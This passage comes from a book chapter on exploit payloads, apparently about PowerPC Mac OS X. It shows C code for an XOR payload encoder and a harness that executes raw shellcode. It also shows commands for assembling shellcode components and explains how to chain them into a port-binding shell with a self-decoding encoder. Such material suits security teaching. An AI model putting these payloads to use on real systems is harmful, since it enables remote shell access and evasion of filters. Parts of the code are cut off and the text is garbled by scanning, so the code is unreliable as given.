xor_key = calculate_key(payload_size, payload, bad_bytes_size,
bad_bytes);
memcpy(xor_key_bytes, &xor_key, sizeof(xor_key_bytes));
printf(“0x%.8x\n”, xor_key);
/*
* Encode payload with given key
*/
encoded_payload = malloc(payload_size);
for (i = 0; i 
#include 
#include 
int main(int argc, char* argv[])
{
char* buf = malloc(10000);
int f, n;
if (argc  Read %d bytes, executing component…\n”, n);
((void(*)(void))buf)();
printf(“==> Done.\n”);
}
Now we will demonstrate how to use test_component to test and run some of
the simple components. This works well for the components that can be tested
9955336633cc0099..iinndddd 223366 11//2255//0099 44::4422::2288 PPMM
Chapter 9 ■ Exploit Payloads 237
individually, such as execve_binsh, system, tcp_connect, and tcp_listen, but for
the others that need to be part of a composite payload, see the next section.
First you need to assemble a component into a standalone binary fi le. On
PowerPC, the GNU assembler outputs fi les in Mach-O format, so use a small
script (o2bin.pl, which is included in this book’s source-code package) to extract
the payload from the Mach-O object fi le and store it in a raw binary fi le.
% cc –c execve_binsh.s
% o2bin.pl execve_binsh.o execve_binsh.bin
Be sure to use the C compiler to assemble your components, because that
will also pass them through the C preprocessor, allowing you to make use of
macros you’ll use in components that require parameters to be specifi ed, such
as decode_longxor.
You can now use test_component to run this component as shown below.
% test_component execve_binsh.bin
==> Read 52 bytes, executing component…
sh-3.2$ exit
exit
Putting Together Simple Payloads
We have written each of the components as independent units that are intended
be combined with each other to form complete functional payloads. This is
done by concatenating and transforming the assembled component binaries.
Many of the components suggest a simple linear order. For example, a TCP port
binding shellcode payload can be constructed by concatenating the tcp_listen,
dup2_std_fds, and execve_binsh components in that order. If you want to build
a self-decoding version of the payload, encode the original payload through the
encode_longxor encoder and prepend the decode_longxor component.